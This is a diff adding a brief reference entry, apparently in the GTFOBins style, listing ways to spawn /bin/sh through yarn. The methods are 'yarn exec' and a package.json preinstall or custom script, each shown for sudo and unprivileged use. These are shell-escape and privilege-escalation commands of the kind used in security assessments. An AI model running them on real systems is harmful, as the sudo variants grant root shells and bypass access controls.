@@ -1,0 +1,27 @@
+yarn
+====
+
+Shell
+-----
+
+[Sudo]
+    yarn exec /bin/sh
+
+[Unprivileged]
+    yarn exec /bin/sh
+
+[Sudo]
+    echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
+yarn --cwd .
+
+[Unprivileged]
+    echo '{"scripts": {"preinstall": "/bin/sh"}}' >package.json
+yarn --cwd .
+
+[Sudo]
+    echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
+yarn --cwd . xxx
+
+[Unprivileged]
+    echo '{"scripts": {"xxx": "/bin/sh"}}' >package.json
+yarn --cwd . xxx
